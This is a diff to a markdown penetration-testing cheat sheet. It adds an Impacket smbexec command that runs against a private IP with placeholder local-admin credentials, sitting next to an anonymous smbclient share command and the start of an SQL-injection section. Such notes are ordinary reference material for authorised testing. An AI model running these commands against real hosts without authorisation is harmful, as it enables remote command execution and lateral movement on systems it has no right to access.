@@ -35,6 +35,10 @@ sudo NetworkManager restart
 ```bash
 smbclient //MOUNT/Yourmomma -I 192.168.154.55 -N
 ```
+##### IMPACKET SYNTAX 
+```bash
+python smbexec.py 'local_admin:P@ssw0rd123'@172.16.80.100
+```
 # SQLi 
 ##### Oracle
 ```bash
